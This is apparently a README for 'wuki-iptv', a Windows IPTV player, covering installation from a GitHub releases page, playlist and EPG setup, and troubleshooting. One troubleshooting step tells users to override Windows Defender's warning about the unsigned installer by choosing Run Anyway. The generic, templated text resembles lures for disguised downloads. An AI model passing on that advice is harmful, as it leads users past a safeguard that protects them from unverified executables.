# 📺 wuki-iptv - Simple IPTV player for Windows desktop

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/oebzdg/wuki-iptv/releases)

wuki-iptv functions as a desktop application for Windows. It plays internet television streams using standard playlist files. The software prioritizes quick access to your video content without complex configuration or background processes.

## 🛠 Features

This application supports core video playback requirements for home users:

*   Load M3U and M3U8 playlist files from your local disk.
*   Display Electronic Program Guide (EPG) data to track current shows.
*   Navigate through channel lists with a standard interface.
*   Maintain a history of recently played media sources.
*   Support for standard video formats used in internet streaming.
*   Lightweight resource usage on modern Windows systems.

## 📁 System Requirements

Ensure your computer meets these basic specifications to maintain stable performance:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4 gigabytes of RAM.
*   Storage: 200 megabytes of free space for installation.
*   Network: A stable internet connection for stream buffering.
*   Graphics: Hardware capable of decoding standard video streams.

## 📥 Getting Started

Follow these steps to set up the application on your machine.

1. Visit the [official releases page](https://github.com/oebzdg/wuki-iptv/releases) to access the latest installer.
2. Select the file ending in `.exe` to begin the download.
3. Save the file to your desktop or your Downloads folder.
4. Locate the downloaded file and double-click the icon to start the installation wizard.
5. Follow the on-screen prompts to place the software on your system.
6. Launch wuki-iptv from your Start menu or desktop shortcut.

## ⚙️ Using the Application

Once the application opens, you must connect a playlist to view content. Most internet television services provide a file link or a direct M3U file.

1. Open the File menu located in the top left corner of the window.
2. Select the option labeled Open Playlist.
3. Navigate to the location of your M3U file and click Open.
4. The application populates the sidebar with your channel list.
5. Click any channel title to start the stream.
6. Use the volume slider and playback controls at the bottom of the window to manage your viewing experience.

## 📡 Managing Program Guide Data

Electronic Program Guide (EPG) information provides timing data for programs. If your provider includes an EPG link, you can load it to see what plays next.

1. Navigate to the Settings tab within the main window.
2. Locate the field labeled EPG URL.
3. Copy and paste your EPG link into this box.
4. Press the Save button to confirm.
5. The application requests data from the source and updates the channel list view with program details.

## 📝 Troubleshooting Common Issues

If you encounter difficulties, check these common areas first.

### Stream Fails to Load
Video streams require a consistent network connection. If a channel fails to load, verify your internet status. Restart the application if the issue persists. Occasionally, the stream source goes offline. If only one channel fails while others work, the fault lies with the service provider.

### Application Runs Slowly
If the interface lags, clear the cache. Go to Settings and select Clear Cache. This process removes temporary files and resets the list state.

### Missing Channels
Ensure your playlist file matches the M3U or M3U8 standard. If you edit the file manually, check for syntax errors or broken links. Use a text editor to verify that each line contains a valid stream path.

### Windows Protects Your PC
During installation, Windows Defender might prompt you with a message stating that the app is unrecognized. This happens because the software is not digitally signed by a central authority. Click More Info and then select Run Anyway to continue with the setup.

## 📦 Privacy and Data Storage

wuki-iptv operates primarily as a local application. It does not send your personal playlist data to remote servers. All configuration files and playlist references remain on your local hard drive. Any network requests made by the software are limited to fetching video streams or EPG metadata from the links you provide. 

The software maintains a local database file to store your history and settings. You can delete this file at any time by navigating to your AppData folder. This resets the application to its original state. 

## 🌐 Community and Support

This application relies on community feedback. If you find bugs or have feature requests, view the repository issues section. Keep your report clear and include the version number of the software you currently use. Avoid sharing private credentials or personal playlist links in public comments or issue reports, as these files allow others to access your services.